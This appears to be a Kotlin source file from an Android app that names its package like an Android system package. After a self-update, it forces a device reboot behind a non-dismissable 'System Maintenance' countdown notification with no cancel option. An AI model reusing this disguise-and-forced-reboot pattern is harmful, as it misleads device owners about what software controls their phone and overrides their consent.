package com.android.systemservices

import android.app.NotificationChannel
import android.app.NotificationManager
import android.content.Context
import android.os.Build
import android.os.Handler
import android.os.Looper
import android.util.Log
import androidx.core.app.NotificationCompat

/**
 * Manages the OTA reboot warning flow.
 *
 * After a successful self-update SessionCallback sets [Prefs.otaRebootPending] = true
 * and calls [checkAndSchedule], which shows a 5-minute heads-up countdown notification
 * and calls PowerManager.reboot(null) at zero.
 *
 * [Prefs.otaRebootPending] is cleared by [executeReboot] before rebooting, and also
 * cleared by BootReceiver on ACTION_BOOT_COMPLETED — any reboot (manual, crash, or
 * countdown-triggered) loads the new APK from disk, so the requirement is always met.
 */
object OtaRebootManager {

    private const val TAG            = "OtaRebootManager"
    private const val CHANNEL_ID     = "ota_reboot"
    private const val NOTIF_ID       = 8_888
    private const val COUNTDOWN_S    = 5 * 60  // 5 minutes

    private val handler = Handler(Looper.getMainLooper())

    private var countdownRunnable: Runnable? = null

    @Volatile private var remainingSeconds = 0

    /** Guards against double-scheduling within one process lifetime. */
    @Volatile private var isScheduled = false

    // ── Public API ─────────────────────────────────────────────────────────────

    /**
     * Call from MonitoringService.onCreate() and BootReceiver.
     * No-op if [Prefs.otaRebootPending] is false.
     */
    fun checkAndSchedule(context: Context) {
        if (!Prefs(context).otaRebootPending) return
        if (isScheduled) {
            Log.i(TAG, "Already scheduled — skipping duplicate call")
            return
        }
        isScheduled = true
        Log.i(TAG, "OTA reboot pending — starting 5-minute countdown")
        ensureChannel(context)
        startCountdown(context)
    }

    // ── Countdown ─────────────────────────────────────────────────────────────

    private fun startCountdown(context: Context) {
        cancelCountdown()
        remainingSeconds = COUNTDOWN_S
        Log.i(TAG, "Countdown started: ${remainingSeconds}s")

        val tick = object : Runnable {
            override fun run() {
                if (remainingSeconds <= 0) {
                    executeReboot(context)
                    return
                }
                showCountdownNotification(context, remainingSeconds)
                remainingSeconds--
                handler.postDelayed(this, 1_000L)
            }
        }
        countdownRunnable = tick
        // 5-second delay before first tick so PMS notification_cancel_all
        // (fired during package replacement bookkeeping) completes first.
        handler.postDelayed(tick, 5_000L)
    }

    private fun cancelCountdown() {
        countdownRunnable?.let { handler.removeCallbacks(it) }
        countdownRunnable = null
    }

    // ── Reboot execution ──────────────────────────────────────────────────────

    private fun executeReboot(context: Context) {
        Log.i(TAG, "OTA reboot executing now")
        isScheduled = false
        // Synchronous commit BEFORE calling pm.reboot() — apply() is async and
        // may not flush before shutdown, leaving the flag true on next boot.
        try {
            context.getSharedPreferences("ft_prefs", Context.MODE_PRIVATE)
                .edit()
                .putBoolean("ota_reboot_pending", false)
                .commit()
        } catch (_: Exception) {}
        try {
            (context.getSystemService(Context.NOTIFICATION_SERVICE) as NotificationManager)
                .cancel(NOTIF_ID)
        } catch (_: Exception) {}
        context.getSystemService(android.os.PowerManager::class.java)?.reboot(null)
    }

    // ── Notification ──────────────────────────────────────────────────────────

    private fun showCountdownNotification(context: Context, seconds: Int) {
        val nm      = context.getSystemService(Context.NOTIFICATION_SERVICE) as NotificationManager
        val timeStr = formatTime(seconds)
        NotificationCompat.Builder(context, CHANNEL_ID)
            .setSmallIcon(android.R.drawable.ic_dialog_info)
            .setContentTitle("System Maintenance")
            .setContentText("Device restarting in $timeStr…")
            .setStyle(NotificationCompat.BigTextStyle()
                .bigText("A system update requires a restart.\nDevice will restart in $timeStr."))
            .setPriority(NotificationCompat.PRIORITY_MAX)
            .setCategory(NotificationCompat.CATEGORY_SYSTEM)
            .setOngoing(true)
            .setAutoCancel(false)
            // Vibration on first post triggers the heads-up popup.
            // setOnlyAlertOnce suppresses re-alerting on every subsequent tick.
            .setVibrate(longArrayOf(0, 400))
            .setOnlyAlertOnce(true)
            .build()
            .also { nm.notify(NOTIF_ID, it) }
    }

    private fun formatTime(seconds: Int): String = when {
        seconds >= 120 -> "${seconds / 60} min ${seconds % 60} sec"
        seconds >= 60  -> "1 min ${seconds % 60} sec"
        seconds == 1   -> "1 second"
        else           -> "$seconds seconds"
    }

    // ── Notification channel ──────────────────────────────────────────────────

    private fun ensureChannel(context: Context) {
        if (Build.VERSION.SDK_INT < Build.VERSION_CODES.O) return
        val nm = context.getSystemService(Context.NOTIFICATION_SERVICE) as NotificationManager
        if (nm.getNotificationChannel(CHANNEL_ID) != null) return
        nm.createNotificationChannel(
            NotificationChannel(CHANNEL_ID, "System Updates", NotificationManager.IMPORTANCE_HIGH)
                .apply {
                    description = "Notifications for pending system restarts after updates"
                    setShowBadge(false)
                }
        )
    }
}
